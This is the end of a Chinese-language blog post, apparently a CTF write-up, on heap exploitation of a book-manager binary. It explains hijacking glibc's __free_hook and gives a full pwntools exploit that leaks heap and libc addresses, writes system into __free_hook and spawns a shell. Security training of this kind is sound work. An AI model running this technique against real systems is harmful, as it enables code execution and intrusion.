class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来先把<code>__free_hook</code>赋值给了<code>hook</code>，然后调用<code>hook</code></p>
<p>如果我们把<code>__free_hook</code>就改成system函数之后，调用free函数的时候就会调用system了</p>
<p>劫持流程是什么呢</p>
<p>接着上面刚刚的继续，此时第一个book_info是指向我们伪造的结构上的，我们可以通过edit来编辑第二个book的des信息，修改成<code>__free_hook</code></p>
<p>然后edit第二个book的des信息，相当于修改<code>__free_hook</code>的值，修改成system的地址，然后通过delete来调用free，相当于调用了system，但是<code>/binsh\x00</code>要在创建book2的时候写到book2的name中</p>
<p>完整exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(size_1,str_1,size_2,str_2)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"1"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Enter book name size: "</span>)</span><br><span class="line">	r.sendline(str(size_1))</span><br><span class="line">	r.recvuntil(<span class="string">"Enter book name (Max 32 chars): "</span>)</span><br><span class="line">	r.sendline(str_1)</span><br><span class="line">	r.recvuntil(<span class="string">"Enter book description size: "</span>)</span><br><span class="line">	r.sendline(str(size_2))</span><br><span class="line">	r.recvuntil(<span class="string">"Enter book description: "</span>)</span><br><span class="line">	r.sendline(str_2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author_name</span><span class="params">(str_1)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"5"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">	r.sendline(str_1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(id_1,str_1)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"3"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">	r.writeline(str(id_1))</span><br><span class="line">	r.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">	r.sendline(str_1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span><span class="params">(id_1)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"2"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Enter the book id you want to delete: "</span>)</span><br><span class="line">	r.sendline(str(id_1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_book(<span class="number">128</span>,<span class="string">"book_name_1"</span>,<span class="number">32</span>,<span class="string">"heap_book_description_1"</span>)</span><br><span class="line">create_book(<span class="number">0x21000</span>,<span class="string">"/bin/sh\x00"</span>,<span class="number">0x21000</span>,<span class="string">"heap_book_description_2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line">heap_book_1 = u64(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">log.info(<span class="string">"heap_book_1: "</span>+hex(heap_book_1))</span><br><span class="line">heap_book_1_description = heap_book_1 - <span class="number">0x30</span></span><br><span class="line">log.info(<span class="string">"heap_book_1_description: "</span>+hex(heap_book_1_description))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"></span><br><span class="line">heap_book_2 = heap_book_1+<span class="number">0x30</span></span><br><span class="line">heap_book_2_name_addr = heap_book_2+<span class="number">8</span></span><br><span class="line">heap_book_2_des_addr = heap_book_2+<span class="number">16</span></span><br><span class="line">payload = p64(<span class="number">1</span>)+p64(heap_book_2_name_addr)+p64(heap_book_2_des_addr)+p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">change_author_name(<span class="string">"b"</span>*<span class="number">32</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">mmap_heap_1_addr = u64(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">mmap_heap_2_addr = u64(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">log.info(<span class="string">"mmap_heap_1_addr : "</span>+hex(mmap_heap_1_addr))</span><br><span class="line">log.info(<span class="string">"mmap_heap_2_addr : "</span>+hex(mmap_heap_2_addr))</span><br><span class="line">base_addr = mmap_heap_2_addr<span class="number">-0x577010</span></span><br><span class="line">log.info(<span class="string">"base_addr : "</span>+hex(base_addr))</span><br><span class="line">__free_hook_addr = base_addr+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.info(<span class="string">"__free_hook_addr : "</span>+hex(__free_hook_addr))</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] +base_addr <span class="comment">#0x4239e 0x423f2 0xe317e</span></span><br><span class="line">log.info(<span class="string">"system_addr : "</span>+hex(system_addr))</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">payload = p64(__free_hook_addr)</span><br><span class="line">edit_book(<span class="number">1</span>,payload+<span class="string">"\x08"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">edit_book(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Enter the book id you want to delete: "</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h3><p>堆这块确实不好搞，搞了两天这个，有点头大</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
